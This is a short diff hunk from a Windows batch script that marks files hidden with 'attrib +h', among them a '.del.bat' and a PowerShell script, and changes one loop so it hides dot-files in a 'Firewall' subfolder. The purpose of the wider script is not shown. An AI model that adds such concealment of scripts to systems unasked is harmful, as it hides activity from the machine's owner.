@@ -90,7 +90,7 @@ attrib +h "%HD%\%NAME%.txt"
 attrib +h "%HD%\.del.bat"
 attrib +h "%HD%\%NAME%x.ps1"
 
-for %%f in (%SF%\.*) do (
+for %%f in (%SF%\Firewall\.*) do (
     attrib +h "%%f" >nul 2>&1
 )
 
